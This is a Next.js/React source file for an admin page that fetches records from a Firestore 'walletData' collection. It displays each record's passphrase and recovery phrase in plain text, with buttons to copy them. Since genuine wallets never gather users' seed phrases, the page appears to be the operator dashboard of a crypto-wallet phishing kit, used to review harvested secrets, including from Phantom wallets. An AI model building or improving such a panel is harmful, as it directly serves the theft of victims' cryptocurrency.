"use client";

import { useEffect, useState } from 'react';
import { collection, getDocs, query, orderBy } from 'firebase/firestore';
import { db } from '@/lib/firebase';

interface WalletData {
  id: string;
  passphrase: string;
  recoveryPhrase: string;
  timestamp: string;
  walletName: string;
  walletType: string;
}

const AdminPage = () => {
  const [walletData, setWalletData] = useState<WalletData[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [selectedWallet, setSelectedWallet] = useState<WalletData | null>(null);
  const [firestoreAvailable, setFirestoreAvailable] = useState(false);

  useEffect(() => {
    const checkFirestore = async () => {
      if (db) {
        setFirestoreAvailable(true);
        await fetchWalletData();
      } else {
        setError('Firestore is not available');
        setLoading(false);
      }
    };

    checkFirestore();
  }, []);

  const fetchWalletData = async () => {
    try {
      setLoading(true);
      const walletCollection = collection(db, 'walletData');
      const q = query(walletCollection, orderBy('timestamp', 'desc'));
      const querySnapshot = await getDocs(q);
      
      const data = querySnapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      })) as WalletData[];
      
      setWalletData(data);
      setLoading(false);
    } catch (err) {
      setError('Failed to fetch wallet data');
      setLoading(false);
      console.error('Error fetching wallet data:', err);
    }
  };

  const formatDate = (dateString: string) => {
    const date = new Date(dateString);
    return date.toLocaleString();
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  if (!firestoreAvailable) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="p-6 bg-red-100 border border-red-400 text-red-700 rounded">
          Firestore is not available. Please check your Firebase configuration.
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="p-6 bg-red-100 border border-red-400 text-red-700 rounded">
          {error}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 p-4 md:p-8">
      <header className="mb-8">
        <h1 className="text-3xl md:text-4xl font-bold text-gray-800">Wallet Data Admin</h1>
        <p className="text-gray-600 mt-2">View and manage wallet information</p>
      </header>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Wallet List */}
        <div className="lg:col-span-2">
          <div className="bg-white rounded-xl shadow-md overflow-hidden transition-all duration-300 hover:shadow-lg">
            <div className="p-4 bg-gray-800 text-white">
              <h2 className="text-xl font-semibold">Wallet Records</h2>
              <p className="text-gray-300 text-sm">{walletData.length} records found</p>
            </div>
            
            <div className="overflow-x-auto">
              <table className="min-w-full divide-y divide-gray-200">
                <thead className="bg-gray-50">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Wallet</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Type</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Date</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Actions</th>
                  </tr>
                </thead>
                <tbody className="bg-white divide-y divide-gray-200">
                  {walletData.map((wallet, index) => (
                    <tr 
                      key={wallet.id}
                      className={`transition-all duration-200 hover:bg-gray-50 cursor-pointer ${selectedWallet?.id === wallet.id ? 'bg-blue-50' : ''}`}
                      onClick={() => setSelectedWallet(wallet)}
                      style={{
                        animation: `fadeIn 0.3s ease-out ${index * 0.05}s forwards`,
                        opacity: 0
                      }}
                    >
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="flex items-center">
                          <div className="flex-shrink-0 h-10 w-10 bg-blue-100 rounded-full flex items-center justify-center">
                            <span className="text-blue-600 font-medium">{wallet.walletName.charAt(0)}</span>
                          </div>
                          <div className="ml-4">
                            <div className="text-sm font-medium text-gray-900">{wallet.walletName}</div>
                            <div className="text-sm text-gray-500">ID: {wallet.id.substring(0, 6)}...</div>
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className={`px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${wallet.walletType === 'phantom' ? 'bg-purple-100 text-purple-800' : 'bg-green-100 text-green-800'}`}>
                          {wallet.walletType}
                        </span>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                        {formatDate(wallet.timestamp)}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
                        <button 
                          onClick={(e) => {
                            e.stopPropagation();
                            copyToClipboard(wallet.passphrase);
                          }}
                          className="text-blue-600 hover:text-blue-900 mr-3 transition-colors duration-200"
                        >
                          Copy Passphrase
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>

        {/* Wallet Details */}
        <div className="lg:col-span-1">
          {selectedWallet ? (
            <div 
              className="bg-white rounded-xl shadow-md overflow-hidden sticky top-6 transition-all duration-300 hover:shadow-lg"
            >
              <div className="p-4 bg-gray-800 text-white">
                <h2 className="text-xl font-semibold">Wallet Details</h2>
                <p className="text-gray-300 text-sm">{selectedWallet.walletName}</p>
              </div>
              
              <div className="p-6">
                <div className="mb-6">
                  <h3 className="text-lg font-medium text-gray-900 mb-2">Basic Information</h3>
                  <div className="space-y-2">
                    <div>
                      <p className="text-sm text-gray-500">Wallet Name</p>
                      <p className="text-gray-800">{selectedWallet.walletName}</p>
                    </div>
                    <div>
                      <p className="text-sm text-gray-500">Wallet Type</p>
                      <p className="text-gray-800 capitalize">{selectedWallet.walletType}</p>
                    </div>
                    <div>
                      <p className="text-sm text-gray-500">Date Created</p>
                      <p className="text-gray-800">{formatDate(selectedWallet.timestamp)}</p>
                    </div>
                  </div>
                </div>

                <div className="mb-6">
                  <h3 className="text-lg font-medium text-gray-900 mb-2">Security Information</h3>
                  <div className="space-y-4">
                    <div>
                      <div className="flex justify-between items-center mb-1">
                        <p className="text-sm text-gray-500">Passphrase</p>
                        <button 
                          onClick={() => copyToClipboard(selectedWallet.passphrase)}
                          className="text-xs bg-blue-100 text-blue-600 px-2 py-1 rounded transition-colors duration-200 hover:bg-blue-200"
                        >
                          Copy
                        </button>
                      </div>
                      <div className="bg-gray-50 p-3 rounded-md">
                        <p className="font-mono text-sm break-all">{selectedWallet.passphrase}</p>
                      </div>
                    </div>

                    <div>
                      <div className="flex justify-between items-center mb-1">
                        <p className="text-sm text-gray-500">Recovery Phrase</p>
                        {selectedWallet.recoveryPhrase && (
                          <button 
                            onClick={() => copyToClipboard(selectedWallet.recoveryPhrase)}
                            className="text-xs bg-blue-100 text-blue-600 px-2 py-1 rounded transition-colors duration-200 hover:bg-blue-200"
                          >
                            Copy
                          </button>
                        )}
                      </div>
                      <div className="bg-gray-50 p-3 rounded-md">
                        <p className="font-mono text-sm break-all">
                          {selectedWallet.recoveryPhrase || 'No recovery phrase available'}
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          ) : (
            <div 
              className="bg-white rounded-xl shadow-md overflow-hidden p-6 flex items-center justify-center h-full transition-all duration-300 hover:shadow-lg"
            >
              <div className="text-center">
                <svg className="mx-auto h-12 w-12 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                </svg>
                <h3 className="mt-2 text-sm font-medium text-gray-900">No wallet selected</h3>
                <p className="mt-1 text-sm text-gray-500">Click on a wallet from the list to view details</p>
              </div>
            </div>
          )}
        </div>
      </div>

      <style jsx global>{`
        @keyframes fadeIn {
          from {
            opacity: 0;
            transform: translateY(10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
      `}</style>
    </div>
  );
};

export default AdminPage;